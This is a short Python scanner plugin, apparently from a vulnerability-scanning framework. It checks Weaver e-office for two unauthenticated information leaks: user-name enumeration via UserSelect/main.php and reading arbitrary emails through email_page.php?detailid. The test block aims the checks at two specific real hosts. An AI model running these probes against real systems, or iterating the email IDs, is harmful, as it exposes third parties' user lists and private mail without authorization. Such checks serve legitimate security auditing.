#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 泛微e-office 两处信息泄露
author: yichin
refer:
    http://www.wooyun.org/bugs/wooyun-2010-0128007
    http://www.wooyun.org/bugs/wooyun-2010-0127270
description:
    UserSelect/main.php 可以遍历所有用户名
    E-mobile/email_page.php?detailid=*** 可以遍历任意邮件
'''
import random
import base64

def assign(service, arg):
    if service == 'weaver_oa':
        return True, arg

def audit(arg):
    url = arg + 'UserSelect/main.php'
    code, head, res, err, _ = curl.curl2(url)
    if code==200 and 'class="menulines" onclick="ClickUser' in res:
        security_info('info disclosure: ' + url)
    url = arg + 'E-mobile/email_page.php?detailid=1'
    code, head, res, err, _ = curl.curl2(url)
    if code==200 and 'type="hidden" id="email_from" name="email_from"' in res:
        security_info('info disclosure: ' + url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://eoffice.sccm.cn/')[1])
    audit(assign('weaver_oa', 'http://219.232.254.131:8082/')[1])